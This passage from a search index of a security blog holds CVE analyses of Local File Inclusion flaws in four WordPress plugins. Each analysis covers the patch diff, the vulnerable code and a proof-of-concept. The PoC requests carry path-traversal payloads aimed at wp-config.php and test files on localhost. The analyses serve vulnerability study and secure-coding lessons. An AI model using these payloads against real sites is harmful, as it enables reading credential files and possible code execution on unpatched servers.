","date":"2025-10-15","objectID":"/posts/2025-10-15-cve-2025-30868/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/posts/2025-10-15-cve-2025-30868/#step-2"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Step 1 Create a new team at endpoint: wp-admin/post-new.php?post_type=team_manager because a new team provides values to add to the Team Manager widget layout. Step 2 Create a post using Elementor and add the Team Manager widget. Add the Team Manager widget to a post Step 3 Submit, capture the request with BurpSuite and send it to Repeater Step 4 Modify the action parameter’s value in the request using the Inspector and resend the payload Result: The debugger jumped to wp-config.php Successful LFI result ","date":"2025-10-15","objectID":"/posts/2025-10-15-cve-2025-30868/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/posts/2025-10-15-cve-2025-30868/#step-3"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Step 1 Create a new team at endpoint: wp-admin/post-new.php?post_type=team_manager because a new team provides values to add to the Team Manager widget layout. Step 2 Create a post using Elementor and add the Team Manager widget. Add the Team Manager widget to a post Step 3 Submit, capture the request with BurpSuite and send it to Repeater Step 4 Modify the action parameter’s value in the request using the Inspector and resend the payload Result: The debugger jumped to wp-config.php Successful LFI result ","date":"2025-10-15","objectID":"/posts/2025-10-15-cve-2025-30868/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/posts/2025-10-15-cve-2025-30868/#step-4"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion CVE-2025-30868 is an LFI in Team Manager ≤2.1.23: renderElementorLayout() fails to validate $layout/$settings, allowing path traversal and include() of arbitrary files. Patched in v2.2.0 using whitelist, regex checks, and realpath() verification. ","date":"2025-10-15","objectID":"/posts/2025-10-15-cve-2025-30868/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/posts/2025-10-15-cve-2025-30868/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways Do not use raw input to build include paths. Use a whitelist for layouts/templates. Sanitize filenames + use realpath() + is_readable() before including. For public endpoints: enforce server-side input controls — nonce alone is not sufficient. ","date":"2025-10-15","objectID":"/posts/2025-10-15-cve-2025-30868/:6:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/posts/2025-10-15-cve-2025-30868/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References File Inclusion/Path traversal — Hacktrick WordPress Team Manager Plugin \u003c= 2.1.23 is vulnerable to Local File Inclusion ","date":"2025-10-15","objectID":"/posts/2025-10-15-cve-2025-30868/:7:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/posts/2025-10-15-cve-2025-30868/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Motors Plugin.","date":"2025-10-14","objectID":"/posts/2025-10-14-cve-2025-32654/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/posts/2025-10-14-cve-2025-32654/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The Motors plugin, version ≤ 1.4.71, contains a Local File Inclusion (LFI) vulnerability that allows an unauthenticated attacker to control a file parameter in an include/require statement, thereby injecting or reading local files on the server (e.g., configuration files containing credentials). This can lead to sensitive information disclosure, and under certain configurations, remote code execution. CVE ID: CVE-2025-32654 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 1.4.71 Patched Versions: 1.4.72 CVSS Severity: High (8.1) Required Privilege: Unauthenticated Product: WordPress Motors Plugin ","date":"2025-10-14","objectID":"/posts/2025-10-14-cve-2025-32654/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/posts/2025-10-14-cve-2025-32654/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions – Motors: 1.4.71 (vulnerable) and 1.4.72 (patched). Diff tool – Meld or any other comparison (diff) tool to inspect and compare differences between two versions. ","date":"2025-10-14","objectID":"/posts/2025-10-14-cve-2025-32654/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/posts/2025-10-14-cve-2025-32654/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis ","date":"2025-10-14","objectID":"/posts/2025-10-14-cve-2025-32654/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/posts/2025-10-14-cve-2025-32654/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff Vulnerable version: public static function motors_ew_grid_tabs() { $template = sanitize_text_field( $_POST['template'] ); // other logic } The vulnerable code only sanitizes HTML characters using sanitize_text_field(), without restricting paths — thus an attacker can inject ../ or any filename, leading to LFI. Patched version: public static function motors_ew_grid_tabs() { $allowed_templates = array( 'listing-cars/listing-grid-directory-loop-4', 'listing-cars/listing-grid-directory-loop-3', 'listing-cars/listing-grid-directory-loop', ); $template = 'listing-cars/' . ( isset( $_POST['template'] ) ? sanitize_file_name( $_POST['template'] ) : '' ); if ( ! in_array( $template, $allowed_templates, true ) ) { wp_send_json_error( 'Invalid template' ); return; } // other logic } The patch applies sanitize_file_name() along with a whitelist to validate input, effectively neutralizing any possible exploitation through the template parameter. ","date":"2025-10-14","objectID":"/posts/2025-10-14-cve-2025-32654/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/posts/2025-10-14-cve-2025-32654/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code The function motors_ew_grid_tabs() is registered as a callback for the action hook \"grid_tabs_widget\" via: add_action( 'wp_ajax_nopriv_grid_tabs_widget', array( self::class, 'motors_ew_grid_tabs' ) ); The prefix wp_ajax_nopriv_ indicates that this action does not require user authentication to trigger the AJAX endpoint. Therefore, the endpoint can be publicly accessed through: /wp-admin/admin-ajax.php?action=grid_tabs_widget When invoked, motors_ew_grid_tabs() is executed: public static function motors_ew_grid_tabs() { check_ajax_referer( 'motors_grid_tabs', 'security' ); $listing_types = apply_filters( 'stm_listings_post_type', 'listings' ); $tab_type = sanitize_text_field( $_POST['tab_type'] ); $per_page = intval( $_POST['per_page'] ); $template = sanitize_text_field( $_POST['template'] ); $img_size = sanitize_text_field( $_POST['img_size'] ); $args = array( 'post_type' =\u003e $listing_types, 'post_status' =\u003e 'publish', 'posts_per_page' =\u003e $per_page, ); if ( 'popular' === $tab_type ) { $args = array_merge( $args, array( 'orderby' =\u003e 'meta_value_num', 'meta_key' =\u003e 'stm_car_views', 'order' =\u003e 'DESC', ) ); } $args['meta_query'][] = array( 'key' =\u003e 'car_mark_as_sold', 'value' =\u003e '', 'compare' =\u003e '=', ); $template_args = array(); if ( ! empty( $img_size ) ) { $template_args = array( 'custom_img_size' =\u003e $img_size, ); } $listings_query = new WP_Query( $args ); if ( $listings_query-\u003ehave_posts() ) { $output = ''; ob_start(); while ( $listings_query-\u003ehave_posts() ) { $listings_query-\u003ethe_post(); do_action( 'stm_listings_load_template', $template, $template_args ); } $output .= ob_get_clean(); } wp_send_json( array( 'html' =\u003e $output, ) ); } At the beginning of motors_ew_grid_tabs(), this line: check_ajax_referer( 'motors_grid_tabs', 'security' ); performs a nonce validation to protect against CSRF (Cross-Site Request Forgery). If the nonce provided by the client is invalid or missing, the function halts further AJAX processing — meaning all subsequent logic (handling $template, post query, and HTML rendering) will not execute. public static function motors_create_nonce() { $grid_tabs_widget = wp_create_nonce( 'motors_grid_tabs' ); // other logic wp_localize_script( 'jquery', 'mew_nonces', array( 'motors_grid_tabs' =\u003e $grid_tabs_widget, // other logic ) ); } The function motors_create_nonce() generates the nonce for 'motors_grid_tabs' using wp_create_nonce() and exposes it to JavaScript via wp_localize_script() under the variable mew_nonces.motors_grid_tabs. Tip Because this vulnerability is unauthenticated, the nonce is not visible in the admin area. Instead, after installing the plugin with all dependencies, open the homepage, then search the page source for the keyword motors_grid_tabs to find the required nonce value. Nonce value shown in browser source Additionally, the homepage source contains a JavaScript snippet that automatically triggers the AJAX call to the endpoint in focus: /wp-admin/admin-ajax.php?action=grid_tabs_widget when the page loads: \u003cscript\u003e (function($) { $(document).ready(function() { $.ajax({ type: \"POST\", url: ajaxurl, dataType: 'json', async: true, data: 'action=grid_tabs_widget\u0026tab_type=popular\u0026per_page=8\u0026template=listing-cars/listing-grid-directory-loop-4\u0026img_size=\u0026security=' + mew_nonces.motors_grid_tabs, success: function(data) { if( data.hasOwnProperty('html') ) $('#popular-tab-content').html(data.html); updateGridItemTitles(); }, }); }); })(jQuery) \u003c/script\u003e This script executes automatically because it’s inside $(document).ready(), so jQuery runs it when the page finishes loading. Leveraging this, we can reload the homepage and intercept the AJAX request using BurpSuite to capture the required parameters. POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0 Accept: application/json, text/javascript, */*; q=0.01 ... action=grid_tabs_widget\u0026tab_type=popular\u0026per_page=8\u0026template=listing-cars/listing-grid-di","date":"2025-10-14","objectID":"/posts/2025-10-14-cve-2025-32654/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/posts/2025-10-14-cve-2025-32654/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-10-14","objectID":"/posts/2025-10-14-cve-2025-32654/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/posts/2025-10-14-cve-2025-32654/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Add a simple test code to wp-config.php: \u003c?php echo \"payload\" Send a POST request containing the LFI payload: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... action=grid_tabs_widget\u0026tab_type=popular\u0026per_page=8\u0026template=/partials/../../../../../payload\u0026img_size=\u0026security=d15dd83890 Result: Successful LFI result ","date":"2025-10-14","objectID":"/posts/2025-10-14-cve-2025-32654/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/posts/2025-10-14-cve-2025-32654/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion CVE-2025-32654 is an LFI vulnerability in Motors ≤ 1.4.71, caused by an unsanitized template parameter that allows path traversal and arbitrary include() calls. The public endpoint (wp_ajax_nopriv_) and nonce exposed in the front-end make it easily exploitable. It was patched in v1.4.72 by normalizing file names and validating them against a whitelist. ","date":"2025-10-14","objectID":"/posts/2025-10-14-cve-2025-32654/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/posts/2025-10-14-cve-2025-32654/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways Never use raw user input to construct file paths for include. Always enforce a whitelist of valid templates/paths. Normalize (e.g. sanitize_file_name()/sanitize_key()), and use realpath() to ensure paths remain within the intended directory. For public endpoints, strictly validate inputs — don’t rely solely on nonce protection. ","date":"2025-10-14","objectID":"/posts/2025-10-14-cve-2025-32654/:6:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/posts/2025-10-14-cve-2025-32654/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References File Inclusion/Path traversal — HackTricks WordPress Motors Plugin \u003c= 1.4.71 is vulnerable to Local File Inclusion ","date":"2025-10-14","objectID":"/posts/2025-10-14-cve-2025-32654/:7:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/posts/2025-10-14-cve-2025-32654/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Geo Mashup Plugin.","date":"2025-10-13","objectID":"/posts/2025-10-13-cve-2025-48293/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/posts/2025-10-13-cve-2025-48293/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The Geo Mashup plugin version ≤ 1.13.16 contains a Local File Inclusion vulnerability that allows an unauthenticated attacker to control the file parameter used in include/require, thereby injecting or reading local files on the server (for example configuration files containing credentials), leading to leakage of sensitive information and, in some configurations, potential code execution. CVE ID: CVE-2025-48293 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 1.13.16 Patched Versions: 1.13.17 CVSS severity: High (9.8) Required Privilege: Unauthenticated Product: WordPress Geo Mashup Plugin ","date":"2025-10-13","objectID":"/posts/2025-10-13-cve-2025-48293/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/posts/2025-10-13-cve-2025-48293/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Geo Mashup: 1.13.16 (vulnerable) and 1.13.17 (patched). Diff tool - Meld or any diff/comparison tool to inspect differences between the two versions. ","date":"2025-10-13","objectID":"/posts/2025-10-13-cve-2025-48293/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/posts/2025-10-13-cve-2025-48293/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis ","date":"2025-10-13","objectID":"/posts/2025-10-13-cve-2025-48293/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/posts/2025-10-13-cve-2025-48293/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff Vulnerable code: public static function generate_object_html( ) { $template_base = ( isset( $_GET['template'] ) ) ? $_GET['template'] : ''; // other logc load_template( GeoMashup::locate_template( $template_base ) ); } $template_base is taken directly from $_GET['template'] without any checks/sanitization. The value is passed to GeoMashup::locate_template() and then used with load_template() — an attacker can control the file path to be included. Patch: public static function generate_object_html( ) { $template_base = ( isset( $_GET['template'] ) ) ? sanitize_key($_GET['template']) : ''; // other logic load_template( GeoMashup::locate_template( $template_base ) ); } sanitize_key() is applied to template =\u003e removes unsafe characters, prevents ../, \\, and special characters, reducing the risk of path traversal and LFI from the template parameter. ","date":"2025-10-13","objectID":"/posts/2025-10-13-cve-2025-48293/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/posts/2025-10-13-cve-2025-48293/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code We analyze the logic in GeoMashup::locate_template() to see how it affects $template_base public static function locate_template( $template_base ) { $template = locate_template( array(\"geo-mashup-$template_base.php\") ); if ( empty( $template ) || !is_readable( $template ) ) { $template = path_join( GEO_MASHUP_DIR_PATH, \"default-templates/$template_base.php\" ); } return $template; } $template is reassigned by calling locate_template() (from template.php) with the argument geo-mashup-$template_base.php function locate_template( $template_names, $load = false, $load_once = true, $args = array() ) { global $wp_stylesheet_path, $wp_template_path; if ( ! isset( $wp_stylesheet_path ) || ! isset( $wp_template_path ) ) { wp_set_template_globals(); } $is_child_theme = is_child_theme(); $located = ''; foreach ( (array) $template_names as $template_name ) { if ( ! $template_name ) { continue; } if ( file_exists( $wp_stylesheet_path . '/' . $template_name ) ) { $located = $wp_stylesheet_path . '/' . $template_name; break; } elseif ( $is_child_theme \u0026\u0026 file_exists( $wp_template_path . '/' . $template_name ) ) { $located = $wp_template_path . '/' . $template_name; break; } elseif ( file_exists( ABSPATH . WPINC . '/theme-compat/' . $template_name ) ) { $located = ABSPATH . WPINC . '/theme-compat/' . $template_name; break; } } if ( $load \u0026\u0026 '' !== $located ) { load_template( $located, $load_once, $args ); } return $located; } The logic checks for the existence of files when concatenated with $template_name; if none exist it returns an empty string ''. File existence related logic When an attacker sends $_GET['template'] containing ../ the file will by default not exist, and locate_template() returns ''. Returning to GeoMashup::locate_template(), when $template is empty and not readable (!is_readable($template)) it is reassigned and returned. const string GEO_MASHUP_DIR_PATH = \"/srv/www/wordpress/wp-content/plugins/geo-mashup\" GEO_MASHUP_DIR_PATH.default-templates/$template_base.php 👉 GeoMashup::locate_template() does not modify $template_base which we control, so we proceed to find a way to trigger this behavior. if ( ( isset( $_GET['output'] ) and 'json' == $_GET['output'] ) or empty( $_GET['object_ids'] ) ) { GeoMashupQuery::generate_location_json( ); } else { GeoMashupQuery::generate_object_html( ); } generate_object_html() is only called when $_GET['output'] is not provided and $_GET['object_ids'] is not empty. geo-query.php containing the above logic is invoked in geo-mashup.php geo-query.php is called within geo-mashup.php The geo_query function is the callback for an Unauthenticated action hook: add_action( 'wp_ajax_nopriv_geo_mashup_query', array( __CLASS__, 'geo_query') ); When accessing the endpoint /wp-admin/admin-ajax.php with action=geo_mashup_query the geo_query callback is executed. ","date":"2025-10-13","objectID":"/posts/2025-10-13-cve-2025-48293/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/posts/2025-10-13-cve-2025-48293/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-10-13","objectID":"/posts/2025-10-13-cve-2025-48293/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/posts/2025-10-13-cve-2025-48293/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Add code to wp-config.php for testing echo \"Payload\"; Send a GET request with an LFI payload GET /wp-admin/admin-ajax.php?action=geo_mashup_query\u0026object_ids=2\u0026template=../../../../wp-config HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: vi,en-US;q=0.7,en;q=0.3 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 X-PwnFox-Color: green Priority: u=0, i Result: Successful LFI result ","date":"2025-10-13","objectID":"/posts/2025-10-13-cve-2025-48293/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/posts/2025-10-13-cve-2025-48293/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion CVE-2025-48293 is an LFI caused by using the template input without validation when concatenating into a fallback path, allowing path traversal (..) and inclusion of unintended files. It was fixed in v1.13.17 by applying sanitize_key(). ","date":"2025-10-13","objectID":"/posts/2025-10-13-cve-2025-48293/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/posts/2025-10-13-cve-2025-48293/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways Do not use user input directly to build paths for includes. Use a whitelist or sanitize_key() + realpath() checks. ","date":"2025-10-13","objectID":"/posts/2025-10-13-cve-2025-48293/:6:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/posts/2025-10-13-cve-2025-48293/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References File Inclusion/Path traversal — Hacktrick WordPress Geo Mashup Plugin \u003c= 1.13.16 is vulnerable to Local File Inclusion ","date":"2025-10-13","objectID":"/posts/2025-10-13-cve-2025-48293/:7:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/posts/2025-10-13-cve-2025-48293/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Poll, Survey \u0026 Quiz Maker Plugin by Opinion Stage Plugin.","date":"2025-10-12","objectID":"/posts/2025-10-12-cve-2025-53328/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/posts/2025-10-12-cve-2025-53328/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The Poll, Survey \u0026 Quiz Maker Plugin by Opinion Stage version ≤ 19.11.0 contains a Local File Inclusion (CVE-2025-53328, CVSS 7.5) vulnerability that allows an unauthenticated attacker to control the file parameter in an include/require call, enabling inclusion or reading of local files on the server (e.g., configuration files containing credentials), leading to disclosure of sensitive information and, in some configurations, potential code execution. CVE ID: CVE-2025-53328 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 19.11.0 Patched Versions: 19.11.1 CVSS severity: High (7.5) Required Privilege: Unauthenticated Product: WordPress Poll, Survey \u0026 Quiz Maker Plugin by Opinion Stage Plugin Important Although the vulnerability is published as Unauthenticated, in many deployments exploitation practically requires minimal internal privileges — for example a Contributor account or equivalent in WordPress. ","date":"2025-10-12","objectID":"/posts/2025-10-12-cve-2025-53328/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/posts/2025-10-12-cve-2025-53328/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Poll, Survey \u0026 Quiz Maker Plugin by Opinion Stage: 19.11.0 (vulnerable) and 19.11.1 (patched). Diff tool - Meld or any diff tool to compare differences between versions. ","date":"2025-10-12","objectID":"/posts/2025-10-12-cve-2025-53328/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/posts/2025-10-12-cve-2025-53328/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis ","date":"2025-10-12","objectID":"/posts/2025-10-12-cve-2025-53328/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/posts/2025-10-12-cve-2025-53328/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff Vulnerable version: private static function prepare_view_file_name_form_current_page() { $view_file_name = ''; if ( !empty( $_REQUEST['page'] ) ) { $qry_str_check_os = sanitize_text_field( $_REQUEST['page'] ); $qry_str_check_os = explode( '-', $qry_str_check_os ); if ( 'opinionstage' === $qry_str_check_os[0] ) { $view_file_name = str_replace( 'opinionstage-', '', sanitize_text_field( $_REQUEST['page'] ) ); $view_file_name = str_replace( '-', '_', $view_file_name ); } } return $view_file_name; } In the vulnerable version, the page parameter is taken from $_REQUEST and controlled by the user but the file name is not properly validated → allowing Local File Inclusion. The function only uses sanitize_text_field and checks the opinionstage- prefix, then removes the prefix and replaces - with _, so an attacker can supply: ?page=opinionstage-../../wp-config Patched version: private static function prepare_view_file_name_from_current_page() { if (empty($_REQUEST['page']) || !is_string($_REQUEST['page'])) { return ''; } $page = sanitize_text_field($_REQUEST['page']); if (substr($page, 0, strlen('opinionstage-')) !== 'opinionstage-') { return ''; } $template_name = substr($page, strlen('opinionstage-')); $template_name = str_replace('-', '_', $template_name); if (!in_array($template_name, self::$allowed_templates, true)) { return ''; } if (strpos($template_name, '..') !== false || strpos($template_name, '/') !== false || strpos($template_name, '\\\\') !== false) { return ''; } return $template_name; } The patch adds multiple protections: type checking, prefix verification (\"opinionstage-\"), a whitelist (self::$allowed_templates), and blocking traversal characters. ","date":"2025-10-12","objectID":"/posts/2025-10-12-cve-2025-53328/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/posts/2025-10-12-cve-2025-53328/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code The function prepare_view_file_name_form_current_page() is called from load_template(): public static function load_template() { $view_file_name = self::prepare_view_file_name_form_current_page(); if ( !$view_file_name ) { return; } $os_client_logged_in = Helper::is_user_logged_in(); $os_options = Helper::get_opinionstage_option(); TemplatesViewer::require_template( 'admin/views/' . $view_file_name, compact( 'os_client_logged_in', 'os_options' ) ); } require_template() is invoked with 'admin/views/'.$view_file_name: public static function require_template($template_name, $args = []) { $path = Opinionstage::get_instance()-\u003eplugin_path . $template_name . '.php'; if( ! file_exists( $path ) ) { return; } extract($args); require( $path ); } The require() call that causes LFI uses $path concatenated from the plugin path (plugin_path), $template_name, and .php: public function register_menu_page() { if ( function_exists( 'add_menu_page' ) ) { $os_client_logged_in = Helper::is_user_logged_in(); if ( $os_client_logged_in ) { add_menu_page( __( 'Opinion Stage', 'social-polls-by-opinionstage' ), __( 'Opinion Stage', 'social-polls-by-opinionstage' ), 'edit_posts', OPINIONSTAGE_MENU_SLUG, [ __CLASS__, 'load_template' ], Opinionstage::get_instance()-\u003eplugin_url . 'admin/images/os-icon.svg', '25.234323221' ); add_submenu_page( OPINIONSTAGE_MENU_SLUG, 'View My Items', 'My Items', 'edit_posts', OPINIONSTAGE_MENU_SLUG ); add_submenu_page( OPINIONSTAGE_MENU_SLUG, 'Tutorials \u0026 Help', 'Tutorials \u0026 Help', 'edit_posts', OPINIONSTAGE_HELP_RESOURCE_SLUG, [ $this, 'load_template' ] ); } else { add_menu_page( __( 'Opinion Stage', 'social-polls-by-opinionstage' ), __( 'Opinion Stage', 'social-polls-by-opinionstage' ), 'edit_posts', OPINIONSTAGE_GETTING_STARTED_SLUG, [ __CLASS__, 'load_template' ], Opinionstage::get_instance()-\u003eplugin_url . 'admin/images/os-icon.svg', '25.234323221' ); add_submenu_page( OPINIONSTAGE_GETTING_STARTED_SLUG, 'Get Started', 'Get Started', 'edit_posts', OPINIONSTAGE_GETTING_STARTED_SLUG, [ $this, 'load_template' ] ); } } } register_menu_page() registers two submenus with load_template as the callback, depending on the user’s login state. To access the admin submenu, the user must be logged into WordPress with at least Contributor privileges → therefore, the required privilege for this CVE is Contributor. Two slugs are declared for the submenus: const string OPINIONSTAGE_MENU_SLUG = \"opinionstage-settings\" const string OPINIONSTAGE_GETTING_STARTED_SLUG = \"opinionstage-getting-started\" ","date":"2025-10-12","objectID":"/posts/2025-10-12-cve-2025-53328/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/posts/2025-10-12-cve-2025-53328/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-10-12","objectID":"/posts/2025-10-12-cve-2025-53328/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/posts/2025-10-12-cve-2025-53328/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Login with a Contributor account Send a POST request: POST /wp-admin/admin.php?page=opinionstage-getting-started HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: vi,en-US;q=0.7,en;q=0.3 Accept-Encoding: gzip, deflate, br Referer: http://localhost/wp-admin/ Connection: keep-alive Cookie: wordpress_86a9106ae65537651a8e456835b316ab=con%7C1760451626%7CeIWnBlZSv8mq15W1MfZbUd1WqiPvrNbuhzcGwDNgRtf%7C95a2ae30f463a8c1d010a70313f3f305e2c6e99b18056b7827132b809329c400; wp-settings-time-3=1760279584; intercom-id-y45xtsgw=f5cf9200-6f02-4b61-bb0a-94ef864e710e; intercom-session-y45xtsgw=; intercom-device-id-y45xtsgw=40def9f9-8e76-4d64-9bbc-28c12b70544f; wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=con%7C1760451626%7CeIWnBlZSv8mq15W1MfZbUd1WqiPvrNbuhzcGwDNgRtf%7C2f86a0974e1c1d7b5ef8322a588e50ef5879561d1fc2f84b7c6eddf5c98ffcce Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin X-PwnFox-Color: green Priority: u=0, i Content-Type: application/x-www-form-urlencoded Content-Length: 28 page=opinionstage-../payload Debugging: Debug - Value of $view_file_name Debug - Value of the $path being required A payload.php file was created for testing: \u003c?php echo \"ABC\"; Result Result of successful LFI ","date":"2025-10-12","objectID":"/posts/2025-10-12-cve-2025-53328/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/posts/2025-10-12-cve-2025-53328/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Explain We leverage how WordPress and the plugin handle parameters: WordPress determines the admin page based on the page in the URL, but the plugin reads page from $_REQUEST — and $_REQUEST will prioritize values from the request body when the request is a POST. Therefore we send a POST to admin.php?page=opinionstage-getting-started (a valid URL page to trigger the callback) while placing page=opinionstage-../payload in the POST body. As a result, WordPress accepts the URL and calls the callback, while the plugin reads page from $_REQUEST (the body) containing the ../ payload — allowing directory traversal and exploiting the LFI. ","date":"2025-10-12","objectID":"/posts/2025-10-12-cve-2025-53328/:4:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/posts/2025-10-12-cve-2025-53328/#explain"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion CVE-2025-53328 is an LFI caused by using the page input without proper validation to build the file path for require() — the opinionstage- prefix is accepted but the remainder can contain .. / \\ to escape the views directory. The patch (v19.11.1) adds type checks, traversal blocking, and a template whitelist. ","date":"2025-10-12","objectID":"/posts/2025-10-12-cve-2025-53328/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/posts/2025-10-12-cve-2025-53328/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways Do not use user input directly to build paths for include/require. Apply a whitelist (or mapping) for template 